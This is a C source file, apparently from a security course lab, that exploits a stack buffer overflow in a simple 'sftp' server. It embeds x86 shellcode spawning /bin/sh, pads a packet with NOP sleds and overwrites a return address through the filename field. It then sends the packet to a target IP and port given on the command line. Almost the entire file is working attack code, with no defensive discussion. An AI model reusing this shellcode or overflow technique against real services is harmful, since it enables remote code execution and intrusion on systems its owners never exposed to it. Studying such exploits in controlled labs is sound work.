/**************************************************
 * compile : gcc -g -o spawn spawn.c              *
 * run : ./spawn server_ip port_num offset        *
 **************************************************/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "sftp.h"

#define NOP 0x90

/******************** Shell Spawning Code ********************/
char exploit_code[] =   "\x31\xc0\x99\x50\x68\x2f\x2f\x73"
			"\x68\x68\x2f\x62\x69\x6e\x89\xe3"
			"\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
/******************** Shell Spawning Code ********************/

int main(int argc, char* argv[]) {
    int so, op;
    Packet pkt;
    unsigned long exploit_code_addr, esp_address, offset;
    struct sockaddr_in remote_addr;
    struct sockaddr_in local_addr;

    if(argc != 4) {
        printf("Usage: spawn <ip_address> <port> <offset>\n");
        exit(-1);
    }

    offset = atoi(argv[3]);
	
    bzero(&remote_addr, sizeof(struct sockaddr_in));
    bzero(&local_addr, sizeof(struct sockaddr_in));
	
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_addr.s_addr = inet_addr(argv[1]);
    remote_addr.sin_port = htons(atoi(argv[2]));

    local_addr.sin_family = AF_INET;

    if ((so = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Failure in creating socket\n");
        exit(-1);
    }
	
    op = 1;

    if (setsockopt(so, SOL_SOCKET, SO_REUSEADDR, (char *) &op, sizeof(op)) < 0) { 
        printf("Failure in setting socket options\n");
        exit(-1);
    }
    if (bind(so, (struct sockaddr*) &local_addr, sizeof(struct sockaddr_in)) < 0) {
        printf("Failure in binding port\n");
        exit(-1);
    }
    if (connect(so, (struct sockaddr_in *) &remote_addr, sizeof(struct sockaddr_in)) < 0) {
        printf("Failure in connecting to %s\n", inet_ntoa(remote_addr.sin_addr));
        exit(-1);
    }

    // You need to change "esp_address" to the "Current stack address" that 
    // sftp server prints out
    // Ex) esp_address = 0xBFE6D8E0
    esp_address = 0xbfffe410; 

    // Set the address into which exploit code will be inserted. 
    exploit_code_addr = esp_address + 1000;
    printf("exploit code address: 0x%x\n", exploit_code_addr);

    /******************** Exploit Code Part ********************/

	pkt.type=0;
	memset(pkt.filename,NOP,32);
	memset(pkt.buf,NOP,1024);
//        strcpy(pkt.filename,"1111111111111111111111111111111111111111111111");

	pkt.filename[44] = exploit_code_addr & 0x000000ff;
	pkt.filename[45] = (exploit_code_addr & 0x0000ff00) >> 8;
	pkt.filename[46] = (exploit_code_addr & 0x00ff0000) >> 16;
	pkt.filename[47] = (exploit_code_addr & 0xff000000) >> 24;

	memcpy(pkt.buf+1000,exploit_code,24);


    /******************** Exploit Code Part ********************/

    send(so, (char *) &pkt, sizeof(Packet), 0); 
    close(so);
}
